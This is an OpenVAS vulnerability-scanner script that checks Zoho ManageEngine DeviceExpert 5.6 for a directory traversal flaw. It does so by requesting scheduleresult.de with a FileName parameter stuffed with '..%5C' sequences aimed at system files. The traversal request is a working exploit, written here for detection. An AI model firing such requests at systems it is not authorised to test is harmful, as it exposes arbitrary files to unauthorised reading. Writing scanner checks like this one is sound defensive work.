###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_manageengine_device_expert_dir_trav_vuln.nasl 5988 2017-04-20 09:02:29Z teissa $
#
# Zoho ManageEngine Device Expert Directory Traversal Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802720");
  script_version("$Revision: 5988 $");
  script_bugtraq_id(52559);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-04-20 11:02:29 +0200 (Thu, 20 Apr 2017) $");
  script_tag(name:"creation_date", value:"2012-03-20 15:57:28 +0530 (Tue, 20 Mar 2012)");
  script_name("Zoho ManageEngine Device Expert Directory Traversal Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/48456/");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/522004");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/110985/manageenginede56-traversal.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 6060);
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name : "impact" , value : "Successful exploitation could allow remote attackers to perform
  directory traversal attacks and read arbitrary files on the affected
  application.

  Impact Level: Application");
  script_tag(name : "affected" , value : "ManageEngine DeviceExpert version 5.6");
  script_tag(name : "insight" , value : "The flaw is due to an input validation error in 'FileName'
  parameter to 'scheduleresult.de', which allows attackers to read arbitrary
  files via a ../(dot dot) sequences.");
  script_tag(name : "solution" , value : "No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");
  script_tag(name : "summary" , value : "This host is running Zoho ManageEngine Device Expert and is
  prone to directory traversal vulnerability.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable initialization
port = 0;
req = "";
res = "";
file = "";
files = "";
sndReq = "";
rcvRes = "";
attack = "";

## HTTP Port
port = get_http_port(default:6060);

## Send and receive the response
sndReq = http_get(item:"/NCMContainer.cc", port:port);
rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

## Confirm the application
if(rcvRes && ">ManageEngine DeviceExpert<" >< rcvRes)
{
  files = traversal_files();
  foreach file (keys(files))
  {
    ## Construct directory traversal attack
    attack = string("/scheduleresult.de/?FileName=",
             crap(data:"..%5C",length:3*15),files[file]);

    ## Send the attack
    req = http_get(item:attack, port:port);
    res = http_keepalive_send_recv(port:port, data:req);
    if(!res){
      continue;
    }

    ## Check the response to confirm vulnerability
    if(res && (egrep(pattern:file, string:res)))
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);